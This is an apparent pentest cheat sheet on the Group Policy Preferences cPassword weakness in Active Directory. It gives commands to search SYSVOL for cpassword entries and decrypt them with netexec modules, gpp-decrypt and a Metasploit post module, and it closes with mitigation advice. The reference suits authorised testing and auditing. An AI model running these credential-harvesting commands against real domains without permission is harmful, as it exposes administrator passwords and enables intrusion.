# GPP / cPassword Attack

## What Is It?

Group Policy Preferences (GPP) allowed admins to embed credentials in XML policy files pushed to domain machines. Microsoft accidentally released the AES encryption key used, making all stored passwords trivially decryptable.

- Patched in **MS14-025** - but patching does not delete existing files
- Files may still exist on old/unpatched DCs
- Still regularly found on real pentests

---

## Where It's Found

Any domain user can read SYSVOL. The cPassword lives in XML files pushed by GPP:

- `Groups.xml` (most common - local user/admin passwords)
- `Services.xml`, `ScheduledTasks.xml`, `Printers.xml`, `Drives.xml`, `DataSources.xml`

Any `<... cpassword="...">` attribute = vulnerable.

---

## Finding cPassword Files

```sh
# Search SYSVOL for cpassword (from a domain-joined box)
findstr /S /I cpassword \\<DC>\SYSVOL\*.xml

# From Linux
smbclient //<DC>/SYSVOL -U 'domain\user%pass'
find . -name "*.xml" -exec grep -l cpassword {} \;
```

---

## Decrypting the Password

### Automated (netexec) - finds AND decrypts
```sh
nxc smb <DC> -u <user> -p <pass> -M gpp_password
nxc smb <DC> -u <user> -p <pass> -M gpp_autologin
```

### Manual (gpp-decrypt)
```sh
gpp-decrypt <encrypted-cpassword-string>
```

### Metasploit
```
use post/windows/gather/credentials/gpp
```

The AES key is publicly known - any gpp-decrypt tool works.

---

## Mitigation

- Patch all systems (MS14-025 prevents new GPP passwords)
- **Manually delete** old Groups.xml files from SYSVOL
- Audit SYSVOL for any remaining cPassword entries
